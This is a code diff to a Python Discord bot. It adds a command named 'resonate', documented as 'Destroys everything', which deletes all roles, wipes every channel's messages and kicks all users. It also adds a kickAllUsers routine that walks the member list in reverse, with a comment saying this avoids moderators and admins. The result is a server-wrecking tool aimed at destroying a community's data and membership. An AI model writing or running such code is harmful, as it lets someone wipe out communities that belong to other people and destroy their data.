@@ -9,6 +9,14 @@ bot = commands.Bot(command_prefix='?', description='asdf')
 async def on_ready():
     print('Logged in as ' + bot.user.name + ' ' + bot.user.id)
 
+
+"""Destroys everything"""
+@bot.command(pass_context = True)
+async def resonate(ctxt):
+    await deleteAllRoles(ctxt)
+    await flushAllChannels(ctxt)
+    await kickAllUsers(ctxt)
+
 """Deletes every message in a given channel"""
 @bot.command(pass_context = True)
 async def flushChannel(ctxt):
@@ -64,5 +72,15 @@ async def deleteAllRoles(ctxt):
 """Delete a single role in a server"""
 async def deleteRole(server, role):
     await bot.delete_role(server,role)
+
+"""Kicks all kickable members in a server"""
+@bot.command(pass_context = True)
+async def kickAllUsers(ctxt):
+    server = ctxt.message.server
+    member_dict = server.members
+    member_list = reversed(list(member_dict)) # To avoid mods/admins
+    for member in member_list:
+        await bot.kick(member)
+
 
 bot.run('token')
